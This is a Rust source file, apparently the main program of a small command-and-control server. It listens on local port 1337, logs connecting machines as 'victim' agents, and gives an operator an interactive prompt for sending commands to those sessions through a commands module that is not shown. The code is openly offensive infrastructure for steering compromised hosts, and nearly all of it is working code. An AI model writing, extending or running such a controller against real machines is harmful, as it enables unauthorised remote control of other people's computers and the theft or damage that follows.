// Dependecies
use std::{io::{Write}, net::TcpListener, sync::{Arc, mpsc::{Receiver, Sender}}, thread::{self, sleep}};
// use rustyline::error::ReadlineError;
use rustyline::{DefaultEditor};
use core::time;


// Internal modules
mod constants;
mod commands;
mod c2_state;

use constants::{RESET, DIM, BOLD, WHITE, GREEN, YELLOW, RED, CYAN, UiEvent};
use c2_state::C2State;


fn handle_server_instruct(instruct: Vec<&str>, state: &C2State) -> Result<bool, String> {
    commands::dispatch_server(instruct, state)
}

fn handle_new_connection(state: Arc<C2State>, ui_tx: Sender<UiEvent>) {
    let listener = TcpListener::bind("127.0.0.1:1337")
        .expect("the port can not be opened...");

    println!("\n\t{DIM}[{RESET}{WHITE}listening:{RESET}{DIM}]{RESET} {CYAN}port 1337{RESET}\n");

    for stream in listener.incoming(){
        match stream {
            Ok(conn) =>  {
                
                // Add address to agent state
                let Some(addr) = conn.peer_addr().ok() else {
                    eprintln!("{}[!]{} No se pudo obtener peer_addr", RED, RESET);
                    return;
                };

                state.add_agent(&addr.to_string(), conn);
                let _ = ui_tx.send(UiEvent::AgentConnected(addr.to_string()));
            },
            Err(error) => {
                eprintln!("Error accepting victim: {}", error)
            }
        }
    }
}


fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), String> { 
    let mut rl = DefaultEditor::new().map_err(|e| e.to_string())?;

    loop {
        // If there is a session session DONT print message
        if state.active_session().is_none() {
            while let Ok(event) = ui_rx.try_recv() {
                match event {
                    UiEvent::AgentConnected(addr) => {
                        println!("\n\t{DIM}[{RESET}{GREEN}conn{RESET}{DIM}]{RESET} {WHITE}{}{RESET}\n", addr);
                    }
                }
            }
        }

        // Read from CLI
        let prompt = constants::build_prompt(&state);
        let instruct = rl.readline(&prompt).map_err(|e| e.to_string())?;

        if instruct.trim().eq_ignore_ascii_case("q") 
            || instruct.trim().eq_ignore_ascii_case("exit") 
        {
            return Ok(());
        }

        if !instruct.trim().is_empty() {
            let _ = rl.add_history_entry(instruct.as_str());
        }
        
        match handle_server_instruct(instruct.trim().split_whitespace().collect(), &state) {
            Ok(_) => (),
            Err(err) => { println!("An error has ocurred: {}", err); break; }
            _ => break
        };
    }

    Ok(())
}


fn main() {
    let state: Arc<C2State> = Arc::new(C2State::new());
    let listener_state = Arc::clone(&state);
    let (ui_tx, ui_rx) = std::sync::mpsc::channel::<constants::UiEvent>();

    // Create thread of new connections
    thread::spawn(move || {  handle_new_connection(listener_state, ui_tx)});
    sleep(time::Duration::from_millis(200));

    if let Err(err) = handle_sessions(state, ui_rx) {
        eprintln!("An error has ocurred: {}", err);
    }   
}